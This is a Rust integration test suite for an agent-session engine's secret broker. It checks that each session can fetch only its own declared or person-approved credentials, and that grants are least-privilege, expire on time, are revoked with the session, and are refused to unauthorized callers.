use super::*;

#[tokio::test]
async fn mutating_requests_are_rate_limited_per_token() {
    let mut cfg = test_config();
    cfg.token_mutating_request_limit_per_minute = 2;

    let (base, _h) = boot_with_config(cfg).await;
    let client = reqwest::Client::builder()
        .default_headers(auth())
        .build()
        .unwrap();

    for name in ["one", "two"] {
        let res = client
            .post(format!("{base}/api/sessions"))
            .json(&json!({ "name": name, "command": ["/bin/true"] }))
            .send()
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::OK);
    }

    let limited = client
        .post(format!("{base}/api/sessions"))
        .json(&json!({ "name": "three", "command": ["/bin/true"] }))
        .send()
        .await
        .unwrap();
    assert_eq!(limited.status(), StatusCode::TOO_MANY_REQUESTS);
    assert!(limited.headers().get("retry-after").is_some());
}

#[tokio::test]
async fn list_sessions_rejects_wrong_token() {
    let (base, _h) = boot().await;
    let client = reqwest::Client::new();
    let res = client
        .get(format!("{base}/api/sessions"))
        .header("Authorization", "Bearer wrong-token")
        .send()
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn secret_broker_serves_a_session_its_own_vogt_token_and_names_the_fix_to_strangers() {
    let tmp = tempfile::tempdir().unwrap();
    // VOGT_HTTP_TOKEN is deliberately not a manifest line.
    let cfg = broker_config(&tmp, "LATER proj later ondemand\n");
    let (base, state, _h) = boot_with_state(cfg).await;
    let client = reqwest::Client::builder()
        .default_headers(auth())
        .build()
        .unwrap();
    let a: uuid::Uuid = create_session_id(&client, &base, "own-a")
        .await
        .parse()
        .unwrap();
    let b: uuid::Uuid = create_session_id(&client, &base, "own-b")
        .await
        .parse()
        .unwrap();
    let broker = state.sessions.secret_broker();
    broker.remember_vogt_token(a, "vogt-token-of-a");
    broker.remember_vogt_token(b, "vogt-token-of-b");
    let (ta, tb) = (broker.issue(a), broker.issue(b));
    let plain = reqwest::Client::new();
    let url = format!("{base}/api/agent-auth/fetch/VOGT_HTTP_TOKEN");

    let r = plain.post(&url).bearer_auth(&ta).send().await.unwrap();
    assert_eq!(r.status(), 200);
    assert_eq!(r.text().await.unwrap(), "vogt-token-of-a");
    let r = plain.post(&url).bearer_auth(&tb).send().await.unwrap();
    assert_eq!(r.text().await.unwrap(), "vogt-token-of-b");

    // No broker token, or an unknown one: a refusal that names the fix.
    for request in [plain.post(&url), plain.post(&url).bearer_auth("not-it")] {
        let r = request.send().await.unwrap();
        assert_eq!(r.status(), 401);
        let error = r.json::<Value>().await.unwrap()["error"]
            .as_str()
            .unwrap()
            .to_string();
        assert!(
            error.contains("start the shell as a Vogt session"),
            "{error}"
        );
        assert!(error.contains("VOGT_TOKEN_FILE"), "{error}");
    }

    // Forgetting the session forgets its token.
    broker.revoke(a);
    assert!(broker.vogt_token(a).is_none());
}

/// WI-4489: the broker refuses a prod-lane credential to a worker-set
/// session, though the manifest declares it; a full-set session gets it.
#[tokio::test]
async fn secret_broker_refuses_vogt_prod_token_to_a_worker_set_session() {
    let tmp = tempfile::tempdir().unwrap();
    let cfg = broker_config(&tmp, "VOGT_PROD_TOKEN proj prod-bridge-token ondemand\n");
    let (base, state, _h) = boot_with_state(cfg).await;
    let client = reqwest::Client::builder()
        .default_headers(auth())
        .build()
        .unwrap();
    let mut ids = Vec::new();
    for set in ["worker", "full"] {
        let id: uuid::Uuid = client
            .post(format!("{base}/api/sessions"))
            .json(&json!({ "name": format!("prod-{set}"), "mcp_set": set }))
            .send()
            .await
            .unwrap()
            .json::<Value>()
            .await
            .unwrap()["id"]
            .as_str()
            .unwrap()
            .parse()
            .unwrap();
        ids.push(id);
    }
    let broker = state.sessions.secret_broker();
    let url = format!("{base}/api/agent-auth/fetch/VOGT_PROD_TOKEN");
    let plain = reqwest::Client::new();

    let r = plain
        .post(&url)
        .bearer_auth(broker.issue(ids[0]))
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 403);
    let error = r.json::<Value>().await.unwrap()["error"]
        .as_str()
        .unwrap()
        .to_string();
    assert!(error.contains("worker set"), "{error}");

    let r = plain
        .post(&url)
        .bearer_auth(broker.issue(ids[1]))
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 200);
}

/// WI-4510: the GitHub check route applies the same prod-lane gate as fetch:
/// it makes the engine resolve the secret, so a worker-set session is refused
/// with a 403 rather than learning anything ("not_github") about it.
#[tokio::test]
async fn github_check_refuses_vogt_prod_token_to_a_worker_set_session() {
    let tmp = tempfile::tempdir().unwrap();
    let cfg = broker_config(&tmp, "VOGT_PROD_TOKEN proj prod-bridge-token ondemand\n");
    let (base, state, _h) = boot_with_state(cfg).await;
    let client = reqwest::Client::builder()
        .default_headers(auth())
        .build()
        .unwrap();
    let id: uuid::Uuid = client
        .post(format!("{base}/api/sessions"))
        .json(&json!({ "name": "prod-check-worker", "mcp_set": "worker" }))
        .send()
        .await
        .unwrap()
        .json::<Value>()
        .await
        .unwrap()["id"]
        .as_str()
        .unwrap()
        .parse()
        .unwrap();
    let r = reqwest::Client::new()
        .post(format!(
            "{base}/api/agent-auth/github-check/VOGT_PROD_TOKEN"
        ))
        .bearer_auth(state.sessions.secret_broker().issue(id))
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 403);
    let error = r.json::<Value>().await.unwrap()["error"]
        .as_str()
        .unwrap()
        .to_string();
    assert!(error.contains("worker set"), "{error}");
}

/// gh#1441: a plain shell is started with no Vogt credential, and in a
/// brokered deployment the pod has none either. An agent started by hand in
/// that shell asks the broker for `VOGT_HTTP_TOKEN`; the engine mints the
/// session's own credential then, once, even when two launchers ask at once.
/// Without a core there is nothing to mint, and the refusal stands.
#[tokio::test]
async fn secret_broker_mints_a_plain_shells_vogt_token_on_demand_once() {
    use axum::{extract::State, routing::post, Router};
    type Calls = Arc<std::sync::Mutex<Vec<Value>>>;
    let calls: Calls = Arc::default();
    async fn token(
        State(calls): State<Calls>,
        axum::Json(body): axum::Json<Value>,
    ) -> axum::Json<Value> {
        let n = {
            let mut calls = calls.lock().unwrap();
            calls.push(body.clone());
            calls.len()
        };
        let id = body["engine_session_id"]
            .as_str()
            .unwrap_or_default()
            .to_string();
        // Slow enough that two unserialised fetches would both mint.
        tokio::time::sleep(std::time::Duration::from_millis(200)).await;
        axum::Json(json!({
            "engine_session_id": id,
            "actor": format!("agent:engine:{id}"),
            "token": if body["revoke"] == json!(true) { Value::Null } else { json!(format!("minted-{n}-for-{id}")) },
            "revoked": 0,
        }))
    }
    let app = Router::new()
        .route("/api/sessions/token", post(token))
        .with_state(Arc::clone(&calls));
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let core_addr = listener.local_addr().unwrap();
    tokio::spawn(async move {
        let _ = axum::serve(listener, app).await;
    });

    let tmp = tempfile::tempdir().unwrap();
    let mut cfg = broker_config(&tmp, "LATER proj later ondemand\n");
    cfg.vogt_core_url = Some(format!("http://{core_addr}"));
    cfg.vogt_core_token = Some("stack-secret".into());
    let (base, state, _h) = boot_with_state(cfg).await;
    let client = reqwest::Client::builder()
        .default_headers(auth())
        .build()
        .unwrap();
    let shell: uuid::Uuid = create_session_id(&client, &base, "plain-shell")
        .await
        .parse()
        .unwrap();
    let mints = |calls: &Calls| {
        calls
            .lock()
            .unwrap()
            .iter()
            .filter(|c| c["revoke"] != json!(true))
            .count()
    };
    assert_eq!(
        mints(&calls),
        0,
        "a plain shell is started without a credential"
    );
    let broker = state.sessions.secret_broker();
    assert!(broker.vogt_token(shell).is_none());

    let grant = broker.issue(shell);
    let plain = reqwest::Client::new();
    let url = format!("{base}/api/agent-auth/fetch/VOGT_HTTP_TOKEN");
    let fetch = || plain.post(&url).bearer_auth(&grant).send();
    let (a, b) = tokio::join!(fetch(), fetch());
    let (a, b) = (a.unwrap(), b.unwrap());
    assert_eq!(a.status(), 200);
    assert_eq!(b.status(), 200);
    let (a, b) = (a.text().await.unwrap(), b.text().await.unwrap());
    assert_eq!(a, format!("minted-1-for-{shell}"));
    assert_eq!(a, b, "both launchers get the one token");
    assert_eq!(mints(&calls), 1, "minted once");
    assert_eq!(broker.vogt_token(shell).as_deref(), Some(a.as_str()));

    // gh#1444: the on-demand credential ends with the session, like a
    // launch-time one.
    client
        .post(format!("{base}/api/sessions/{shell}/kill"))
        .send()
        .await
        .unwrap();
    let deadline = tokio::time::Instant::now() + Duration::from_secs(10);
    while !calls
        .lock()
        .unwrap()
        .iter()
        .any(|c| c["revoke"] == json!(true) && c["engine_session_id"] == shell.to_string())
    {
        assert!(
            tokio::time::Instant::now() < deadline,
            "no revoke: {:?}",
            calls.lock().unwrap()
        );
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    assert!(broker.vogt_token(shell).is_none());

    // Without a core there is nothing to mint: the refusal names the fix.
    let tmp2 = tempfile::tempdir().unwrap();
    let (base2, state2, _h2) =
        boot_with_state(broker_config(&tmp2, "LATER proj later ondemand\n")).await;
    let other: uuid::Uuid = create_session_id(&client, &base2, "no-core-shell")
        .await
        .parse()
        .unwrap();
    let r = plain
        .post(format!("{base2}/api/agent-auth/fetch/VOGT_HTTP_TOKEN"))
        .bearer_auth(state2.sessions.secret_broker().issue(other))
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 404);
}

/// A session started the way vogt-core starts one (its token already in the
/// spec's env, so the engine mints nothing) and a plain shell given a token
/// the same way: the broker serves each its own, through the real spawn path.
#[tokio::test]
async fn secret_broker_serves_the_token_a_core_started_session_was_given() {
    let tmp = tempfile::tempdir().unwrap();
    let cfg = broker_config(&tmp, "LATER proj later ondemand\n");
    let (base, state, _h) = boot_with_state(cfg).await;
    let client = reqwest::Client::builder()
        .default_headers(auth())
        .build()
        .unwrap();
    let start = |name: &'static str, token: &'static str| {
        let client = client.clone();
        let base = base.clone();
        async move {
            let r = client
                .post(format!("{base}/api/sessions"))
                .json(&json!({ "name": name, "env": [["VOGT_HTTP_TOKEN", token]] }))
                .send()
                .await
                .unwrap()
                .json::<Value>()
                .await
                .unwrap();
            r["id"].as_str().unwrap().parse::<uuid::Uuid>().unwrap()
        }
    };
    let a = start("core-a", "core-token-of-a").await;
    let b = start("core-b", "core-token-of-b").await;
    let broker = state.sessions.secret_broker();
    let plain = reqwest::Client::new();
    let url = format!("{base}/api/agent-auth/fetch/VOGT_HTTP_TOKEN");

    let r = plain
        .post(&url)
        .bearer_auth(broker.issue(a))
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 200);
    assert_eq!(r.text().await.unwrap(), "core-token-of-a");
    let r = plain
        .post(&url)
        .bearer_auth(broker.issue(b))
        .send()
        .await
        .unwrap();
    assert_eq!(r.text().await.unwrap(), "core-token-of-b");

    broker.revoke(a);
    assert!(broker.vogt_token(a).is_none());
}

#[tokio::test]
async fn secret_broker_hands_a_session_one_declared_secret_and_only_that() {
    let tmp = tempfile::tempdir().unwrap();
    let cfg = broker_config(
        &tmp,
        "LAUNCHED proj launched\nLATER proj later ondemand\nBROKEN proj broken ondemand\n",
    );
    let (base, state, _h) = boot_with_state(cfg).await;
    let client = reqwest::Client::builder()
        .default_headers(auth())
        .build()
        .unwrap();
    let id = create_session_id(&client, &base, "broker").await;
    let session: uuid::Uuid = id.parse().unwrap();
    let token = state.sessions.secret_broker().issue(session);
    // A session, not an operator: no engine bearer on this client.
    let plain = reqwest::Client::new();
    let fetch = |var: &str| format!("{base}/api/agent-auth/fetch/{var}");

    // The declared, on-demand name: the value, verbatim, marked no-store.
    let r = plain
        .post(fetch("LATER"))
        .bearer_auth(&token)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 200);
    assert_eq!(r.headers()["cache-control"], "no-store");
    assert_eq!(r.text().await.unwrap(), "value-of-LATER");

    // Policy is manifest membership, not only `ondemand`.
    let r = plain
        .post(fetch("LAUNCHED"))
        .bearer_auth(&token)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 200);
    assert_eq!(r.text().await.unwrap(), "value-of-LAUNCHED");

    // An undeclared name is refused with the manifest line to add — the
    // message a session sees is the fix, not "credential missing".
    let r = plain
        .post(fetch("NOPE"))
        .bearer_auth(&token)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 403);
    let error = r.json::<Value>().await.unwrap()["error"]
        .as_str()
        .unwrap()
        .to_string();
    assert!(error.contains("NOPE"), "{error}");
    assert!(error.contains("ENGINE_AGENT_AUTH_SECRETS"), "{error}");
    assert!(error.contains("ondemand"), "names the flag to use: {error}");

    // A helper failure is reported as the upstream's own reason, never as a
    // value and never as an engine fault.
    let r = plain
        .post(fetch("BROKEN"))
        .bearer_auth(&token)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 502);
    let error = r.json::<Value>().await.unwrap()["error"]
        .as_str()
        .unwrap()
        .to_string();
    assert!(error.contains("missing or empty"), "{error}");

    // Only the session's own token opens the broker: not a made-up one, not
    // none, and not the engine bearer — a token that can create sessions has
    // no business reading their secrets.
    for (label, request) in [
        (
            "wrong token",
            plain.post(fetch("LATER")).bearer_auth("not-it"),
        ),
        ("no token", plain.post(fetch("LATER"))),
        (
            "engine bearer",
            plain.post(fetch("LATER")).bearer_auth(TEST_TOKEN),
        ),
    ] {
        let r = request.send().await.unwrap();
        assert_eq!(r.status(), 401, "{label}");
    }

    // Forgetting the session forgets its leave to ask.
    assert!(client
        .delete(format!("{base}/api/sessions/{id}"))
        .send()
        .await
        .unwrap()
        .status()
        .is_success());
    let r = plain
        .post(fetch("LATER"))
        .bearer_auth(&token)
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 401, "revoked with the session");
}

/// WI-4406: a project named only in `ENGINE_AGENT_AUTH_SECRETS_FILE` is
/// grantable while the file composes. A bad live edit of the file falls back
/// to the deploy-time manifest (by design, so launches never stop), which
/// drops that project. The 403 must then name the refusing engine by its pod
/// identity and say why the file was ignored, not just "not open to grants".
#[tokio::test]
async fn a_grant_for_a_project_named_only_in_the_manifest_file_says_why_it_is_refused() {
    const STACK: &str = "stack-secret-for-file-grants-1234567890";
    let tmp = tempfile::tempdir().unwrap();
    let manifest_file = tmp.path().join("agent-auth-secrets");
    std::fs::write(&manifest_file, "FILE_VAR fileproj file-secret ondemand\n").unwrap();
    let mut cfg = broker_config(&tmp, "STACK stackproj stack-secret\n");
    cfg.agent_auth_secrets_file = Some(manifest_file.clone());
    cfg.vogt_core_token = Some(STACK.into());
    std::env::set_var("ENGINE_POD_ENGINE_ID", "wi4406-lane");
    let (base, _state, _h) = boot_with_state(cfg).await;
    let operator = reqwest::Client::builder()
        .default_headers(auth())
        .build()
        .unwrap();
    let core = reqwest::Client::builder()
        .default_headers(auth_for(STACK))
        .build()
        .unwrap();
    let target = create_session_id(&operator, &base, "file-worker").await;
    let in_an_hour = (OffsetDateTime::now_utc() + time::Duration::hours(1))
        .format(&time::format_description::well_known::Rfc3339)
        .unwrap();
    let grant = |id: &str, var: &str| {
        json!({
            "grant_id": id,
            "var": var,
            "project_id": "fileproj",
            "secret_name": "file-granted",
            "uses": "ttl",
            "expires_at": in_an_hour,
            "reason": "the worker needs the file's project",
        })
    };

    // While the file composes, its project is grantable.
    let applied = core
        .post(format!("{base}/api/sessions/{target}/grants"))
        .json(&grant("grt_file_1", "FILE_GRANT"))
        .send()
        .await
        .unwrap();
    assert_eq!(applied.status(), 200, "{:?}", applied.text().await);

    // A bad edit: the file re-declares STACK, so it no longer composes.
    std::fs::write(
        &manifest_file,
        "FILE_VAR fileproj file-secret ondemand\nSTACK other other-secret\n",
    )
    .unwrap();
    let refused = core
        .post(format!("{base}/api/sessions/{target}/grants"))
        .json(&grant("grt_file_2", "FILE_GRANT_2"))
        .send()
        .await
        .unwrap();
    assert_eq!(refused.status(), 403);
    let body = refused.text().await.unwrap();
    assert!(
        body.contains("refused by engine wi4406-lane, which counts 1 grantable project(s)"),
        "{body}"
    );
    assert!(
        body.contains("ENGINE_AGENT_AUTH_SECRETS_FILE is ignored: "),
        "{body}"
    );
    assert!(body.contains("declares STACK again"), "{body}");
    std::env::remove_var("ENGINE_POD_ENGINE_ID");
}

/// WI-973: a person-approved credential grant, as the engine holds and
/// honours it. Only vogt-core's identity may apply or revoke one; it reaches
/// only the session it was granted to; `once` is consumed by the first fetch;
/// `ttl` stands until revoked or expired; and a grant never shadows the
/// manifest or reaches a project the operator has not opened.
#[tokio::test]
async fn an_approved_grant_reaches_only_its_session_until_revoked_or_expired() {
    const STACK: &str = "stack-secret-for-grants-1234567890";
    let tmp = tempfile::tempdir().unwrap();
    let mut cfg = broker_config(&tmp, "LATER proj later ondemand\n");
    // A helper that also says which manifest it was run with, so the test
    // sees the granted line replace the deployment's for the call.
    let helper = tmp.path().join("grant-helper");
    std::fs::write(
        &helper,
        "#!/bin/sh\n[ \"$1\" = get ] || exit 64\n[ \"$2\" = GRANT_BROKEN ] && exit 3\nprintf 'value-of-%s|%s' \"$2\" \"$ENGINE_AGENT_AUTH_SECRETS\"\n",
    )
    .unwrap();
    std::fs::set_permissions(&helper, std::fs::Permissions::from_mode(0o700)).unwrap();
    cfg.agent_auth_helper = helper;
    cfg.vogt_core_token = Some(STACK.into());
    cfg.agent_grant_projects = vec!["extra".into()];
    let (base, state, _h) = boot_with_state(cfg).await;
    let operator = reqwest::Client::builder()
        .default_headers(auth())
        .build()
        .unwrap();
    let core = reqwest::Client::builder()
        .default_headers(auth_for(STACK))
        .build()
        .unwrap();
    let plain = reqwest::Client::new();
    let target = create_session_id(&operator, &base, "worker").await;
    let other = create_session_id(&operator, &base, "bystander").await;
    let target_token = state
        .sessions
        .secret_broker()
        .issue(target.parse().unwrap());
    let other_token = state.sessions.secret_broker().issue(other.parse().unwrap());
    let fetch = |token: &str, var: &str| {
        plain
            .post(format!("{base}/api/agent-auth/fetch/{var}"))
            .bearer_auth(token.to_string())
            .send()
    };
    let in_an_hour = (OffsetDateTime::now_utc() + time::Duration::hours(1))
        .format(&time::format_description::well_known::Rfc3339)
        .unwrap();
    let grant = |id: &str, var: &str, project: &str, uses: &str, expires: &str| {
        json!({
            "grant_id": id,
            "var": var,
            "project_id": project,
            "secret_name": "100.109.218.11_SSH",
            "uses": uses,
            "expires_at": expires,
            "reason": "the worker needs the emulator key",
        })
    };

    // Deny by default: nothing granted, nothing fetched.
    assert_eq!(
        fetch(&target_token, "GRANT_SSH").await.unwrap().status(),
        403
    );

    // A project neither the manifest nor ENGINE_AGENT_GRANT_PROJECTS names is
    // refused with a 403 whose body says which engine refused it and how many
    // projects that engine would grant (WI-4406).
    let unlisted = core
        .post(format!("{base}/api/sessions/{target}/grants"))
        .json(&grant(
            "grt_unlisted",
            "GRANT_OTHER",
            "not-listed",
            "once",
            &in_an_hour,
        ))
        .send()
        .await
        .unwrap();
    assert_eq!(unlisted.status(), 403);
    let refusal = unlisted.text().await.unwrap();
    assert!(refusal.contains("not open to grants"), "{refusal}");
    assert!(refusal.contains("refused by engine "), "{refusal}");
    // `proj` (manifest) and `extra` (grant projects): two grantable projects.
    assert!(
        refusal.contains("counts 2 grantable project(s)"),
        "{refusal}"
    );

    // vogt-core asks the same question before a person is asked (WI-4523):
    // the check gives the refusal the apply gave, and none for `extra`.
    let check = |client: &reqwest::Client, project: &str| {
        client
            .get(format!("{base}/api/sessions/{target}/grant-check"))
            .query(&[("project_id", project)])
            .send()
    };
    let closed: serde_json::Value = check(&core, "not-listed")
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(closed["grantable"], false);
    let said = closed["refusal"].as_str().unwrap();
    assert!(said.contains("not open to grants"), "{said}");
    assert!(refusal.contains(said), "{refusal} / {said}");
    let open: serde_json::Value = check(&core, "extra").await.unwrap().json().await.unwrap();
    assert_eq!(open["grantable"], true);
    assert!(open["refusal"].is_null());
    assert_eq!(check(&operator, "extra").await.unwrap().status(), 403);

    // Only vogt-core applies a grant: the break-glass operator token holds
    // `sessions` and is still refused.
    let refused = operator
        .post(format!("{base}/api/sessions/{target}/grants"))
        .json(&grant("grt_1", "GRANT_SSH", "proj", "once", &in_an_hour))
        .send()
        .await
        .unwrap();
    assert_eq!(refused.status(), 403);
    assert!(refused.text().await.unwrap().contains("only vogt-core"));

    let applied = core
        .post(format!("{base}/api/sessions/{target}/grants"))
        .json(&grant("grt_1", "GRANT_SSH", "proj", "once", &in_an_hour))
        .send()
        .await
        .unwrap();
    assert_eq!(applied.status(), 200, "{:?}", applied.text().await);

    // It reaches only its own session.
    assert_eq!(
        fetch(&other_token, "GRANT_SSH").await.unwrap().status(),
        403
    );
    let got = fetch(&target_token, "GRANT_SSH").await.unwrap();
    assert_eq!(got.status(), 200);
    assert_eq!(
        got.text().await.unwrap(),
        "value-of-GRANT_SSH|GRANT_SSH proj 100.109.218.11_SSH ondemand",
        "the helper sees exactly the granted line as its manifest"
    );
    // `once`: consumed by that fetch.
    assert_eq!(
        fetch(&target_token, "GRANT_SSH").await.unwrap().status(),
        403
    );

    // A standing (ttl) grant answers until it is revoked; the session can list
    // it, never with a value.
    core.post(format!("{base}/api/sessions/{target}/grants"))
        .json(&grant("grt_2", "GRANT_SSH", "extra", "ttl", &in_an_hour))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap();
    for _ in 0..2 {
        assert_eq!(
            fetch(&target_token, "GRANT_SSH").await.unwrap().status(),
            200
        );
    }
    let listed: Vec<Value> = plain
        .get(format!("{base}/api/agent-auth/grants"))
        .bearer_auth(&target_token)
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(listed.len(), 1);
    assert_eq!(listed[0]["grant_id"], "grt_2");
    assert_eq!(
        listed[0]["reason"], "the worker needs the emulator key",
        "the session sees the purpose the person approved"
    );
    assert!(!listed[0].to_string().contains("value-of"));
    // One approval never silently ends another: a different grant for a var
    // the session can already fetch is refused, while re-applying the same
    // grant (a retried approval) replaces it.
    let in_use = core
        .post(format!("{base}/api/sessions/{target}/grants"))
        .json(&grant("grt_2b", "GRANT_SSH", "proj", "once", &in_an_hour))
        .send()
        .await
        .unwrap();
    assert_eq!(in_use.status(), 409);
    assert!(in_use
        .text()
        .await
        .unwrap()
        .contains("already holds a live grant"));
    core.post(format!("{base}/api/sessions/{target}/grants"))
        .json(&grant("grt_2", "GRANT_SSH", "extra", "ttl", &in_an_hour))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap();
    // An operator reads a session's grants; the reason rides along.
    let seen: Vec<Value> = operator
        .get(format!("{base}/api/sessions/{target}/grants"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(seen.len(), 1, "{seen:?}");
    assert_eq!(seen[0]["grant_id"], "grt_2");
    let empty: Vec<Value> = plain
        .get(format!("{base}/api/agent-auth/grants"))
        .bearer_auth(&other_token)
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert!(empty.is_empty());
    assert_eq!(
        operator
            .delete(format!("{base}/api/sessions/{target}/grants/grt_2"))
            .send()
            .await
            .unwrap()
            .status(),
        403,
        "revoking is vogt-core's too"
    );
    core.delete(format!("{base}/api/sessions/{target}/grants/grt_2"))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap();
    assert_eq!(
        fetch(&target_token, "GRANT_SSH").await.unwrap().status(),
        403
    );

    // A `once` grant is spent by its first fetch even when the helper fails:
    // taken before the helper runs and never put back, so a revoke landing
    // mid-fetch is not undone by the failure.
    core.post(format!("{base}/api/sessions/{target}/grants"))
        .json(&grant(
            "grt_broken",
            "GRANT_BROKEN",
            "proj",
            "once",
            &in_an_hour,
        ))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap();
    assert_eq!(
        fetch(&target_token, "GRANT_BROKEN").await.unwrap().status(),
        502,
        "the helper failed"
    );
    assert_eq!(
        fetch(&target_token, "GRANT_BROKEN").await.unwrap().status(),
        403,
        "a failed once-fetch still spent the grant"
    );
    let after_failure: Vec<Value> = plain
        .get(format!("{base}/api/agent-auth/grants"))
        .bearer_auth(&target_token)
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert!(
        after_failure.iter().all(|g| g["grant_id"] != "grt_broken"),
        "{after_failure:?}"
    );

    // Least privilege: never a manifest name, never an unopened project,
    // never past 24 h or already expired.
    let too_late = (OffsetDateTime::now_utc() + time::Duration::days(2))
        .format(&time::format_description::well_known::Rfc3339)
        .unwrap();
    for (body, status) in [
        (grant("g", "LATER", "proj", "ttl", &in_an_hour), 409),
        (
            grant("g", "GRANT_SSH", "elsewhere", "ttl", &in_an_hour),
            403,
        ),
        (grant("g", "GRANT_SSH", "proj", "ttl", &too_late), 400),
        (
            grant("g", "GRANT_SSH", "proj", "ttl", "2020-01-01T00:00:00Z"),
            400,
        ),
        (grant("g", "not a var", "proj", "ttl", &in_an_hour), 400),
    ] {
        let r = core
            .post(format!("{base}/api/sessions/{target}/grants"))
            .json(&body)
            .send()
            .await
            .unwrap();
        assert_eq!(r.status(), status, "{body}");
    }

    // Expiry is enforced at use, not only shown.
    let soon = (OffsetDateTime::now_utc() + time::Duration::milliseconds(1500))
        .format(&time::format_description::well_known::Rfc3339)
        .unwrap();
    core.post(format!("{base}/api/sessions/{target}/grants"))
        .json(&grant("grt_3", "GRANT_SSH", "proj", "ttl", &soon))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap();
    assert_eq!(
        fetch(&target_token, "GRANT_SSH").await.unwrap().status(),
        200
    );
    tokio::time::sleep(Duration::from_millis(1700)).await;
    assert_eq!(
        fetch(&target_token, "GRANT_SSH").await.unwrap().status(),
        403
    );

    // The session ending takes its grants with it.
    core.post(format!("{base}/api/sessions/{target}/grants"))
        .json(&grant("grt_4", "GRANT_SSH", "proj", "ttl", &in_an_hour))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap();
    operator
        .post(format!("{base}/api/sessions/{target}/kill"))
        .send()
        .await
        .unwrap();
    let deadline = tokio::time::Instant::now() + Duration::from_secs(10);
    loop {
        let held: Vec<Value> = operator
            .get(format!("{base}/api/sessions/{target}/grants"))
            .send()
            .await
            .unwrap()
            .json()
            .await
            .unwrap_or_default();
        if held.is_empty() {
            break;
        }
        assert!(
            tokio::time::Instant::now() < deadline,
            "grants outlived the session"
        );
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    let late = core
        .post(format!("{base}/api/sessions/{target}/grants"))
        .json(&grant("grt_5", "GRANT_SSH", "proj", "ttl", &in_an_hour))
        .send()
        .await
        .unwrap();
    assert_eq!(late.status(), 409, "no grant for an exited session");
}

/// WI-1331: `GET /api/agent-auth/git-credential?host=` serves a `git:<host>`
/// grant's token to its own session, spends a `once` grant, and refuses the
/// rest: no token, a stranger's token, a wrong host, and a project outside the
/// manifest all fail without a value.
#[tokio::test]
async fn the_git_credential_route_serves_a_git_grant_once_and_refuses_the_rest() {
    const STACK: &str = "stack-secret-for-git-credential-1234567890";
    let tmp = tempfile::tempdir().unwrap();
    let mut cfg = broker_config(&tmp, "LATER proj later ondemand\n");
    let helper = tmp.path().join("git-helper");
    std::fs::write(
        &helper,
        "#!/bin/sh\n[ \"$1\" = get ] || exit 64\nprintf 'forge-token-of-%s' \"$2\"\n",
    )
    .unwrap();
    std::fs::set_permissions(&helper, std::fs::Permissions::from_mode(0o700)).unwrap();
    cfg.agent_auth_helper = helper;
    cfg.vogt_core_token = Some(STACK.into());
    let (base, state, _h) = boot_with_state(cfg).await;
    let operator = reqwest::Client::builder()
        .default_headers(auth())
        .build()
        .unwrap();
    let core = reqwest::Client::builder()
        .default_headers(auth_for(STACK))
        .build()
        .unwrap();
    let plain = reqwest::Client::new();
    let target = create_session_id(&operator, &base, "pusher").await;
    let other = create_session_id(&operator, &base, "bystander").await;
    let target_token = state
        .sessions
        .secret_broker()
        .issue(target.parse().unwrap());
    let other_token = state.sessions.secret_broker().issue(other.parse().unwrap());
    let ask = |token: Option<&str>, host: &str| {
        let mut request = plain.get(format!("{base}/api/agent-auth/git-credential?host={host}"));
        if let Some(token) = token {
            request = request.bearer_auth(token.to_string());
        }
        request.send()
    };
    let in_an_hour = (OffsetDateTime::now_utc() + time::Duration::hours(1))
        .format(&time::format_description::well_known::Rfc3339)
        .unwrap();
    let apply = |id: &str, reason: &str, uses: &str| {
        core.post(format!("{base}/api/sessions/{target}/grants"))
            .json(&json!({
                "grant_id": id,
                "var": format!("GIT_{id}"),
                "project_id": "proj",
                "secret_name": "forge-pat",
                "uses": uses,
                "expires_at": in_an_hour,
                "reason": reason,
            }))
            .send()
    };

    // Unauthenticated and unknown callers learn nothing.
    assert_eq!(ask(None, "github.com").await.unwrap().status(), 401);
    assert_eq!(
        ask(Some("not-a-token"), "github.com")
            .await
            .unwrap()
            .status(),
        401
    );
    // No grant yet: 404 naming how to ask for one.
    let none = ask(Some(&target_token), "github.com").await.unwrap();
    assert_eq!(none.status(), 404);
    assert!(none
        .text()
        .await
        .unwrap()
        .contains("session_grant_request reason=git:github.com"));

    apply("g1", "git:GitHub.com push the scratch branch", "once")
        .await
        .unwrap()
        .error_for_status()
        .unwrap();
    // A wrong host, a prefix of a longer host, and another session: 404.
    assert_eq!(
        ask(Some(&target_token), "forge.example.com")
            .await
            .unwrap()
            .status(),
        404
    );
    assert_eq!(
        ask(Some(&target_token), "github.co")
            .await
            .unwrap()
            .status(),
        404
    );
    assert_eq!(
        ask(Some(&other_token), "github.com")
            .await
            .unwrap()
            .status(),
        404
    );
    // The first ask is answered and spends the `once` grant.
    let got = ask(Some(&target_token), "GITHUB.com").await.unwrap();
    assert_eq!(got.status(), 200);
    let body: Value = got.json().await.unwrap();
    assert_eq!(body["username"], "x-access-token");
    assert_eq!(body["token"], "forge-token-of-GIT_g1");
    assert_eq!(
        ask(Some(&target_token), "github.com")
            .await
            .unwrap()
            .status(),
        404,
        "a once grant is spent by the first prompt"
    );

